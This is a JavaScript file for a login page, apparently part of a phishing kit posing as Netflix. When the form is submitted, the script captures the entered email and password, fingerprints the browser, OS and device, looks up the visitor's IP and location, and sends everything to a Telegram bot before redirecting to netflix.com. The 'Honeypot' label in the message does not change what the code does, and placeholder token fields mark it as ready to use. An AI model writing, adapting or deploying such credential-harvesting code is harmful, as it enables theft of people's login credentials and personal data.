document.addEventListener("DOMContentLoaded", () => {
  /**
   * Asynchronously gets the detailed operating system version.
   * @returns {Promise<string>} A promise that resolves to the OS version string.
   */
  async function getOsVersion() {
    if (!navigator.userAgentData) return "Not Available";
    try {
      const uaData = await navigator.userAgentData.getHighEntropyValues(['platformVersion']);
      const platform = uaData.platform || "Unknown";
      const version = uaData.platformVersion || "Unknown";
      if (platform === "Windows") {
        const majorVersion = parseInt(version.split('.')[0]);
        if (majorVersion >= 13) return `Windows 11 or newer (${version})`;
        return `Windows 10 or older (${version})`;
      }
      return `${platform} ${version}`;
    } catch (error) {
      console.error("Could not get OS version:", error);
      return "Permission Denied";
    }
  }

  /**
   * Asynchronously gets the detailed browser name and version.
   * @param {string} userAgentString - The navigator.userAgent string for fallback.
   * @returns {Promise<string>} A promise that resolves to the Browser and Version string.
   */
  async function getBrowserInfo(userAgentString) {
    if (navigator.brave && await navigator.brave.isBrave()) {
      const match = userAgentString.match(/chrome\/([\d\.]+)/i);
      return `Brave ${match ? match[1] : ''}`.trim();
    }
    if (navigator.userAgentData) {
      try {
        const uaData = await navigator.userAgentData.getHighEntropyValues(['fullVersionList']);
        const brands = uaData.fullVersionList;
        const edgeBrand = brands.find(b => b.brand.toLowerCase().includes('edge'));
        if (edgeBrand) return `Edge ${edgeBrand.version}`;
        const operaBrand = brands.find(b => b.brand.toLowerCase().includes('opera'));
        if (operaBrand) return `Opera ${operaBrand.version}`;
        const chromeBrand = brands.find(b => b.brand.toLowerCase().includes('chrome'));
        if (chromeBrand) return `Chrome ${chromeBrand.version}`;
        const otherBrand = brands.find(b => !['Chromium', 'Not/A)Brand'].includes(b.brand));
        if (otherBrand) return `${otherBrand.brand} ${otherBrand.version}`;
      } catch (error) { /* Fallback */ }
    }
    const ua = userAgentString.toLowerCase();
    let match;
    if ((match = ua.match(/edg\/([\d\.]+)/i))) return `Edge ${match[1]}`;
    if ((match = ua.match(/opr\/([\d\.]+)/i))) return `Opera ${match[1]}`;
    if ((match = ua.match(/firefox\/([\d\.]+)/i))) return `Firefox ${match[1]}`;
    if ((match = ua.match(/chrome\/([\d\.]+)/i))) return `Chrome ${match[1]}`;
    if ((match = ua.match(/version\/([\d\.]+).*safari/i))) return `Safari ${match[1]}`;
    return "Unknown";
  }


  const form = document.getElementById("loginForm");
  if (!form) return;

  // --- Main form submission logic ---
  form.addEventListener("submit", async function (e) {
    e.preventDefault();

    console.log("Form submission triggered!");
    const email = document.getElementById("emailInput").value;
    const password = document.getElementById("passwordInput").value;
    console.log(`Captured Email: ${email}`);
    console.log(`Captured Password: ${password}`);

    const ua = navigator.userAgent;
    const browserInfo = await getBrowserInfo(ua);
    const osVersion = await getOsVersion();

    const uaLower = ua.toLowerCase();
    let device = /mobile/i.test(uaLower) ? "Mobile" : "Desktop";
    let os = "Unknown";
    if (/windows/i.test(uaLower)) os = "Windows";
    else if (/android/i.test(uaLower)) os = "Android";
    else if (/iphone|ipad/i.test(uaLower)) os = "iOS";
    else if (/mac/i.test(uaLower)) os = "macOS";
    else if (/linux/i.test(uaLower)) os = "Linux";

    const payload = {
      email,
      password,
      userAgent: ua,
      device,
      os,
      osVersion,
      browser: browserInfo,
    };

    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(ip => {
        payload.ip = ip.ip;
        payload.city = ip.city;
        payload.country = ip.country_name;

        const TELEGRAM_TOKEN = "your_telegram_bot_token_here"; // Replace with your actual Telegram bot token
        const CHAT_ID = "your_chat_id_here"; // Replace with your actual chat ID
        
        const msg = `
🛑 *Honeypot Triggered*
📧 Email: ${payload.email}
🔑 Password: ${payload.password}
🌍 IP: ${payload.ip} (${payload.city}, ${payload.country})
💻 Browser: *${payload.browser}*
🧠 OS: ${payload.os} (Version: *${payload.osVersion}*)
📱 Device: ${payload.device}
`;

        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: "Markdown"
          })
        });

        console.log("✅ Data sent to Telegram");

        setTimeout(() => {
          window.location.href = "https://www.netflix.com/"; 
        }, 1000);
      })
      .catch(err => console.error("❌ Logging failed:", err));
  });

  // --- NEW: Explicitly handle Enter key submission ---
  const emailInput = document.getElementById("emailInput");
  const passwordInput = document.getElementById("passwordInput");

  function handleEnterKey(event) {
    // Check if the key pressed was 'Enter'
    if (event.key === "Enter") {
      // Prevent any default behavior
      event.preventDefault();
      // Manually trigger the form's submit event
      form.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
    }
  }

  emailInput.addEventListener("keydown", handleEnterKey);
  passwordInput.addEventListener("keydown", handleEnterKey);
  
});